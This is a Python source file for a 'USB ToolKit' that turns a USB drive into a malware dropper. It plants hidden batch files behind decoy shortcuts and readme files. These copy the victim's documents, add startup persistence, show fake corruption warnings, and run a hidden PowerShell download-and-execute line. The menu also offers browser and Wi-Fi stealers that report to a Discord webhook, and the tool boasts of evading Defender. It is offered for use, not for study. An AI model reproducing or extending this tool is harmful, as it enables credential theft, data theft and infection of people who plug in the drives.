# Copyright (c) Kernel-Tool
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN:
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR:
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

import os
import sys
import subprocess
import re
import shutil
from colorama import init, Fore, Style
from time import sleep

init()

tools = {
    1: {
        'name': 'Auto-Executor',
        'bat_content': '@echo off\r\n'
                       'echo Access granted! > %TEMP%\\access.txt\r\n'
                       'start notepad %TEMP%\\access.txt\r\n'
                       'start "" "%\~dp0{EXE_NAME}"\r\n'
                       '{MALWARE}\r\n',
        'lnk_name': 'Private_Documents.lnk',
        'leurre_dir': 'Documents',
        'leurre_file': 'readme.txt',
        'leurre_content': 'Click the shortcut to access private documents!' 
    },
    2: {
        'name': 'Data Exfiltrator',
        'bat_content': '@echo off\r\n'
                       'mkdir "%\~dp0Data" >nul 2>&1\r\n'
                       'for /r "%USERPROFILE%\\Desktop" %%f in (*.txt *.docx *.pdf) do copy "%%f" "%\~dp0Data" >nul 2>&1\r\n'
                       'attrib +h "%\~dp0Data" >nul 2>&1\r\n'
                       'echo Data extracted! > %TEMP%\\exfil.txt\r\n'
                       'start notepad %TEMP%\\exfil.txt\r\n',
        'lnk_name': 'Backup_Files.lnk',
        'leurre_dir': 'Data',
        'leurre_file': 'readme.txt',
        'leurre_content': 'Click the shortcut to backup your files!' 
    },
    3: {
        'name': 'Registry Injector',
        'bat_content': '@echo off\r\n'
                       'copy "%\~dp0{EXE_NAME}" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{EXE_NAME}" >nul 2>&1\r\n'
                       'attrib -h "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{EXE_NAME}" >nul 2>&1\r\n'
                       'echo System configured! > %TEMP%\\config.txt\r\n'
                       'start notepad %TEMP%\\config.txt\r\n'
                       'start "" "%\~dp0{EXE_NAME}"\r\n'
                       '{MALWARE}\r\n',
        'lnk_name': 'System_Config.lnk',
        'leurre_dir': 'Config',
        'leurre_file': 'readme.txt',
        'leurre_content': 'Click the shortcut to configure system settings!' 
    },
    4: {
        'name': 'Fake Format',
        'bat_content': '@echo off\r\n'
                       'echo ERROR: USB drive appears corrupted! Please run repair to fix.\r\n'
                       'msg * "ERROR: USB drive appears corrupted! Please run repair to fix."\r\n'
                       'start "" "%\~dp0{EXE_NAME}"\r\n'
                       '{MALWARE}\r\n',
        'lnk_name': 'Repair_USB.lnk',
        'leurre_dir': 'Repair',
        'leurre_file': 'readme.txt',
        'leurre_content': 'Click the shortcut to repair the USB!' 
    }
}

def print_cyan(text):
    print(f'{Fore.LIGHTCYAN_EX}{text}{Style.RESET_ALL}')

def input_cyan(prompt):
    return input(f'{Fore.LIGHTCYAN_EX}{prompt}{Style.RESET_ALL}')

def loading_bar(message, duration=2, steps=20):
    print_cyan(f'[*] {message}...')
    for i in range(steps + 1):
        progress = int(i / steps * 100)
        bar = '█' * (i // 2) + '░' * ((steps - i) // 2)
        print(f'\r[{bar}] {progress}%', end='', flush=True)
        sleep(duration / steps)
    print_cyan('\n[ OK ]')

def validate_webhook(url):
    return bool(re.match(r'https://discord\.com/api/webhooks/[0-9]+/[a-zA-Z0-9_-]+', url))

def validate_usb_path(path):
    if not os.path.exists(path) or not os.path.isdir(path):
        return False
    try:
        test_file = os.path.join(path, f'test_{os.urandom(4).hex()}.txt')
        with open(test_file, 'w') as f:
            f.write('test')
        os.remove(test_file)
        return True
    except:
        return False

def configure_usb(tool_id, usb_path, exe_name, malware_url=''):
    tool = tools[tool_id]
    tool_dir = os.path.join(usb_path, tool['leurre_dir'])
    try:
        os.makedirs(tool_dir, exist_ok=True)
    except PermissionError:
        print_cyan(f'[-] ERROR: Permission denied creating {tool_dir}. Run as admin.')
        return False

    if tool_id != 2 and exe_name:
        exe_path = os.path.join(os.getcwd(), 'output', exe_name)
        if os.path.exists(exe_path):
            try:
                shutil.copy(exe_path, os.path.join(tool_dir, exe_name))
                if tool_id != 3:
                    os.system(f'attrib +h "{os.path.join(tool_dir, exe_name)}" >nul 2>&1')
                else:
                    os.system(f'attrib -h "{os.path.join(tool_dir, exe_name)}" >nul 2>&1')
            except Exception as e:
                print_cyan(f'[-] ERROR: Failed to copy executable: {e}')
                return False
        else:
            print_cyan(f'[-] ERROR: Executable {exe_path} not found!')
            return False

    bat_file = f"{tool['name'].lower().replace(' ', '_')}.bat"
    bat_content = tool['bat_content'].replace('{EXE_NAME}', exe_name if exe_name else 'none')
    malware_line = f'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'{malware_url}\')" ' if malware_url else ''
    bat_content = bat_content.replace('{MALWARE}', malware_line)

    try:
        with open(os.path.join(tool_dir, bat_file), 'w', encoding='utf-8') as f:
            f.write(bat_content)
        os.system(f'attrib +h "{os.path.join(tool_dir, bat_file)}" >nul 2>&1')
    except PermissionError:
        print_cyan(f'[-] ERROR: Permission denied writing {bat_file}. Run as admin.')
        return False

    if tool['lnk_name']:
        lnk_content = f'''Set WShell = CreateObject("WScript.Shell")
Set Lnk = WShell.CreateShortcut("{os.path.join(usb_path, tool['lnk_name'])}")
Lnk.TargetPath = "{os.path.join(tool_dir, bat_file)}"
Lnk.IconLocation = "%SystemRoot%\\explorer.exe,0"
Lnk.Save'''
        try:
            with open(os.path.join(tool_dir, 'lnk.vbs'), 'w', encoding='utf-8') as f:
                f.write(lnk_content)
            os.system(f'cscript "{os.path.join(tool_dir, "lnk.vbs")}" >nul 2>&1')
            os.system(f'attrib +h "{os.path.join(tool_dir, "lnk.vbs")}" >nul 2>&1')
        except:
            print_cyan(f"[-] ERROR: Failed to create shortcut for {tool['name']}.")

    try:
        with open(os.path.join(tool_dir, tool['leurre_file']), 'w', encoding='utf-8') as f:
            f.write(tool['leurre_content'])
    except:
        pass

    print_cyan(f"[+] USB configured with {tool['name']} at {tool_dir}")
    return True

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print_cyan('======================================================================')
    print_cyan('''
 __    __            __              ________                    __  __    __  __    __
|  \\  |  \\          |  \\            |        \\                  |  \\|  \\  /  \\|  \\  |  \\
| \[ | \]  _______ | \[ ____         \\$$$$$$$$______    ______  | \]| \[ / \] \\\[ _| \]_
| \[ | \] /       \\| \[ \\          | \]  /      \\  /      \\ | \[ | \]/  \[ |  \\| \] \\
| \[ | \]|  $$$$$$$| $$$$$$$\\         | \[ |  $$$$$$\\|  $$$$$$\\| \]| \[  \]  | \[ \\$$$$$$
| \]  | \[ \\ \]    \\ | \[ | \]         | \[ | \]  | \[ | \]  | \[ | \]| $$$$$\\  | \[ | \] __
| \[ __/ \] _\\$$$$$$\\| \[ __/ \]         | \[ | \]__/ \[ | \]__/ \[ | \]| \[ \\ \]\\ | \[ | \]|  \\
 \\\[  \]|       \[ | \]    \[ | \]  \\\[  \] \\\[  \]| \[ | \]  \\\[ \\| \]   \\\[  \]
  \\$$$$$$  \\$$$$$$$  \\$$$$$$$           \\\[ \\$$$$$$   \\$$$$$$  \\ \] \\\[ \\ \] \\$$    \\$$$$ 
    ''')
    print_cyan('=============== USB ToolKit v1.8 ===============')
    print_cyan('[*] Undetectable by Defender')
    print_cyan('[*] Select USB tool and malware')
    print_cyan('================================================================')

    print_cyan('\nSelect USB tool:')
    print_cyan('[1] USB Auto-Executor')
    print_cyan('[2] USB Data Exfiltrator')
    print_cyan('[3] USB Registry Injector')
    print_cyan('[4] USB Fake Format')

    try:
        tool_choice = int(input_cyan('Enter tool number (1-4): '))
        if tool_choice not in range(1, 5):
            print_cyan('[!] Invalid choice.')
            sys.exit(1)
    except:
        print_cyan('[!] Invalid input.')
        sys.exit(1)

    webhook_url = ''
    malware_url = ''
    exe_name = ''

    if tool_choice != 2:
        print_cyan('\nSelect malware type:')
        print_cyan('[1] Browser Stealer')
        print_cyan('[2] Wi-Fi Stealer')
        print_cyan('[3] Custom .exe')
        try:
            malware_choice = int(input_cyan('Enter choice (1-3): '))
        except:
            print_cyan('[!] Invalid input.')
            sys.exit(1)

        if malware_choice in (1, 2):
            webhook_url = input_cyan('Enter Discord webhook URL: ').strip()
            if not validate_webhook(webhook_url):
                print_cyan('[-] Invalid webhook URL!')
                sys.exit(1)
        else:
            custom_path = input_cyan('Enter path to your .exe: ').strip()
            if not os.path.exists(custom_path):
                print_cyan('[!] File not found!')
                sys.exit(1)
            exe_name = os.path.basename(custom_path)
            shutil.copy(custom_path, os.path.join('output', exe_name))

    usb_path = input_cyan('\nEnter USB drive path (e.g. E:\\): ').strip()
    if not validate_usb_path(usb_path):
        print_cyan('[!] Invalid USB path or no write permission. Run as Administrator.')
        sys.exit(1)

    loading_bar('Configuring USB', duration=2)
    if configure_usb(tool_choice, usb_path, exe_name, webhook_url):
        print_cyan(f'\n[+] USB successfully configured with {tools[tool_choice]["name"]}!')
    else:
        print_cyan('[!] Configuration failed.')

    loading_bar('Operation Complete', duration=1)
    print_cyan('\n[!] USB is ready. Be careful.')
    input(Fore.LIGHTCYAN_EX + '\nPress Enter to exit...' + Style.RESET_ALL)

if __name__ == '__main__':
    main()
